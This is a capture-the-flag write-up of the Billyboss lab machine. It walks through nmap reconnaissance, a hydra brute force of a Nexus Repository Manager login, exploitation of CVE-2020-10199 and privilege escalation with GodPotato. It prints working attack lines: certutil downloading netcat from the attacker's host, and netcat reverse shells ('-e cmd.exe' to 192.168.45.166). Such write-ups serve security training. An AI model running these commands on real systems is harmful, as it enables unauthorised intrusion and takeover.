# CTF Writeup: Billyboss

---

## Reconaissance

An initial nmap scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.158.61
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-07 05:33 EST
Warning: 192.168.158.61 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.158.61
Host is up (0.022s latency).
Not shown: 65500 closed tcp ports (reset)
PORT      STATE    SERVICE       VERSION
21/tcp    open     ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open     http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-cors: HEAD GET POST PUT DELETE TRACE OPTIONS CONNECT PATCH
|_http-title: BaGet
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds?
5040/tcp  open     unknown
7680/tcp  open     pando-pub?
8081/tcp  open     http          Jetty 9.4.18.v20190429
|_http-server-header: Nexus/3.21.0-05 (OSS)
|_http-title: Nexus Repository Manager
| http-robots.txt: 2 disallowed entries 
|_/repository/ /service/
49664/tcp open     msrpc         Microsoft Windows RPC
49665/tcp open     msrpc         Microsoft Windows RPC
49666/tcp open     msrpc         Microsoft Windows RPC
49667/tcp open     msrpc         Microsoft Windows RPC
49668/tcp open     msrpc         Microsoft Windows RPC
49669/tcp open     msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=11/7%OT=21%CT=1%CU=41781%PV=Y%DS=4%DC=T%G=Y%TM=690DCBA
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10C%TI=I%CI=I%TS=U)SEQ(SP=1
OS:04%GCD=1%ISR=108%TI=I%CI=I%TS=U)SEQ(SP=105%GCD=1%ISR=10B%TI=I%CI=I%TS=U)
OS:SEQ(SP=105%GCD=1%ISR=10D%TI=I%CI=I%TS=U)SEQ(SP=F8%GCD=2%ISR=FC%TI=I%CI=I
OS:%TS=U)OPS(O1=M578NW8NNS%O2=M578NW8NNS%O3=M578NW8%O4=M578NW8NNS%O5=M578NW
OS:8NNS%O6=M578NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(
OS:R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=
OS:R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R
OS:UCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-11-07T10:36:14
|_  start_date: N/A

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   21.38 ms 192.168.45.1
2   21.27 ms 192.168.45.254
3   21.44 ms 192.168.251.1
4   21.50 ms 192.168.158.61

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 198.98 seconds
```

The webserver hosted on port 80 is running an application named "BaGet", searched up for Default API Path.

Found API Index on & Version information on 3.0.0

```
http://192.168.158.61/v3/index.json
```
```
curl http://192.168.158.61/v3/index.json | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1214  100  1214    0     0  25080      0 --:--:-- --:--:-- --:--:-- 25291
{
  "version": "3.0.0",
  "resources": [
    {
      "@id": "http://192.168.158.61/api/v2/package",
      "@type": "PackagePublish/2.0.0",
      "comment": null
    },
    {
      "@id": "http://192.168.158.61/api/v2/symbol",
      "@type": "SymbolPackagePublish/4.9.0",
      "comment": null
    },
    {
      "@id": "http://192.168.158.61/v3/search",
      "@type": "SearchQueryService",
      "comment": null
    },
    {
      "@id": "http://192.168.158.61/v3/search",
      "@type": "SearchQueryService/3.0.0-beta",
      "comment": null
    },
    {
      "@id": "http://192.168.158.61/v3/search",
      "@type": "SearchQueryService/3.0.0-rc",
      "comment": null
    },
    {
      "@id": "http://192.168.158.61/v3/registration",
      "@type": "RegistrationsBaseUrl",
      "comment": null
    },
    {
      "@id": "http://192.168.158.61/v3/registration",
      "@type": "RegistrationsBaseUrl/3.0.0-rc",
      "comment": null
    },
    {
      "@id": "http://192.168.158.61/v3/registration",
      "@type": "RegistrationsBaseUrl/3.0.0-beta",
      "comment": null
    },
    {
      "@id": "http://192.168.158.61/v3/package",
      "@type": "PackageBaseAddress/3.0.0",
      "comment": null
    },
    {
      "@id": "http://192.168.158.61/v3/autocomplete",
      "@type": "SearchAutocompleteService",
      "comment": null
    },
    {
      "@id": "http://192.168.158.61/v3/autocomplete",
      "@type": "SearchAutocompleteService/3.0.0-rc",
      "comment": null
    },
    {
      "@id": "http://192.168.158.61/v3/autocomplete",
      "@type": "SearchAutocompleteService/3.0.0-beta",
      "comment": null
    }
  ]
}
```

Those didn't seem to be helpful tho.

The Webserver (port 8081) seems to be running "Nexus Repository Manager" Version 3.21.0-05
Feroxbuster retrieved /static endpoint.


Default Credentials for Nexus Application are admin:admin123, but they didn't work!

Since those Default Credentials aren't working. Let's try an tool called cewl in order to create an wordlist. The tool crawls all strings from the webpage & creates an wordlist out of it.

We can then use this wordlist to bruteforce the login.

Since we discovered an login page on http://192.168.158.61:8081/ and the default credentials didn't seem to work, let's create an wordlist using cewl.

```
cewl --lowercase http://192.168.158.61:8081 > wordlist
```

Created wordlist

```
nexus
repository
manager
loading
form
history
browse
spinner
logo
product
oss
ico
favicon
resources
rapture
static
http
src
image
new
```

Opening the Dev Console & Analyzing the login server response, the server base64 encodes the credentials. So I'm assuming if we want to bruteforce the correct credentials, we will have to encode them.

If we want to brutefroce credentials, we will have to tell hydra that the user & password variable is base64 encoded, we can do it by defining the user variable like this: ^USER64^.

```
hydra -L wordlist -P wordlist 192.168.158.61 -s 8081 http-post-form "/service/rapture/session:username=^USER64^&password=^PASS64^:F=Incorrect username or password, or no permission to use the application."
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-07 08:34:23
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 400 login tries (l:20/p:20), ~25 tries per task
[DATA] attacking http-post-form://192.168.158.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:F=Incorrect username or password, or no permission to use the application.
[8081][http-post-form] host: 192.168.158.61   login: nexus   password: nexus
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-07 08:34:40
```

Logged in with credentials nexus:nexus

## Vulnerability Assessment

Searched up for CVE's for Nexus Repository Manager

```
searchsploit Nexus Repository Manager       
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
Nexus Repository Manager - Java EL Injection RCE (Metasploit)                       | linux/remote/48343.rb
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

The Application is vulnerable to CVE-2020-10199 which is an Authenticated Remote Code Execution. Let's abuse it and get an Foothold on the target system.

Downloaded and modified the exploit:

```
URL='http://192.168.158.61:8081'
CMD='cmd.exe /c certutil -urlcache -split -f http://192.168.45.166/nc64.exe C:/Windows/Temp/nc.exe'
USERNAME='nexus'
PASSWORD='nexus'
```

The exploit will download netcat onto C:\Windows\Temp. Therefore make sure that the binary is in the directory in which we will launch our server

```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.158.61 - - [07/Nov/2025 09:03:35] "GET /nc64.exe HTTP/1.1" 200 -
192.168.158.61 - - [07/Nov/2025 09:03:35] "GET /nc64.exe HTTP/1.1" 200 -
```

After executing the exploit it successfully downloaded netcat onto the target, we can now get an reverse connection, by executing the netcat binary on the server.

In order to now get RCE, let's start up our listener on port 1337

```
nc -lvnp 1337
```


Let's modify the exploit and run it again, so the netcat binary get's executed on the target server.

```
CMD='cmd.exe /c C:/Windows/Temp/nc.exe'
```

Modified the exploit to get an reverse connection to our local machine ip and port.

```
CMD='cmd.exe /c C:/Windows/Temp/nc.exe -e cmd.exe 192.168.45.166 1337'
```

## Initial Access

Gained RCE as user "nathan"

```
nc -lvnp 1337               
listening on [any] 1337 ...
connect to [192.168.45.166] from (UNKNOWN) [192.168.158.61] 61508
Microsoft Windows [Version 10.0.18362.719]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\nathan\Nexus\nexus-3.21.0-05>whoami
whoami
billyboss\nathan
```


Retrieved local.txt in C:\Users\nathan\Desktop

```
7c65403255b09e028d2bc7263722767c
```

## Privilege Escalation

Checking nathan's privileges, we can see that SeImpersonatePrivilege is enabled.

```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

I downloaded PrintSpoofer.exe onto the target machine, but it didn't work.

```
C:\Temp>PrintSpoofer.exe -i -c cmd.exe
PrintSpoofer.exe -i -c cmd.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[-] Operation failed or timed out.
```

Enumerated OS Version

```
OS Name:                   Microsoft Windows 10 Pro
```

This means that it's vulnerable to GodPotato.exe. We should get Administrator abusing this. Let's do it!

Downloaded GodPotato-NET4.exe onto the target system and ran the following command to get an reverse connection using netcat. Also started up an listener on port 8888

```
nc -lvnp 8888
```


```
PS C:\Temp> ./GodPotato.exe -cmd "C:/Windows/Temp/nc.exe 192.168.45.166 8888 -e cmd.exe"            
./GodPotato.exe -cmd "C:/Windows/Temp/nc.exe 192.168.45.166 8888 -e cmd.exe"                                          
[*] CombaseModule: 0x140711670317056                                                                                  
[*] DispatchTable: 0x140711672659552                                                                                  
[*] UseProtseqFunction: 0x140711672027584                                                                             
[*] UseProtseqFunctionParamCount: 6                                                                                   
[*] HookRPC                                                                                     
[*] Start PipeServer                                                                                                  
[*] CreateNamedPipe \\.\pipe\8dd6ec48-3f45-45ae-bd77-2ef258ad03c9\pipe\epmapper                                       
[*] Trigger RPCSS                                                                                                     
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046                                                               
[*] DCOM obj IPID: 00007c02-04b0-ffff-8200-1b537de9e7c9                                                               
[*] DCOM obj OXID: 0xf222d84301d8c5b3                                                                                 
[*] DCOM obj OID: 0xc7dc2bdeb2090955                                                                                  
[*] DCOM obj Flags: 0x281                                                                                             
[*] DCOM obj PublicRefs: 0x0                                                                                          
[*] Marshal Object bytes len: 100                                                                                     
[*] UnMarshal Object                                                                                                  
[*] Pipe Connected!                                                                                                   
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE                                                                         
[*] CurrentsImpersonationLevel: Impersonation                                                                         
[*] Start Search System Token                                                                                         
[*] PID : 840 Token:0x764  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation                                
[*] Find System Token : True                                                                                          
[*] UnmarshalObject: 0x80070776                                                                                       
[*] CurrentUser: NT AUTHORITY\SYSTEM                                                                                  
[*] process start with pid 4224
```


Gained RCE as user "Administrator".

```
nc -lvnp 8888                              
listening on [any] 8888 ...
connect to [192.168.45.166] from (UNKNOWN) [192.168.158.61] 61528
Microsoft Windows [Version 10.0.18362.719]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```


Retrieved proof.txt in C:\Users\Administrator\Desktop

```
f0893704d4361b49a042b50b0a558cae
```
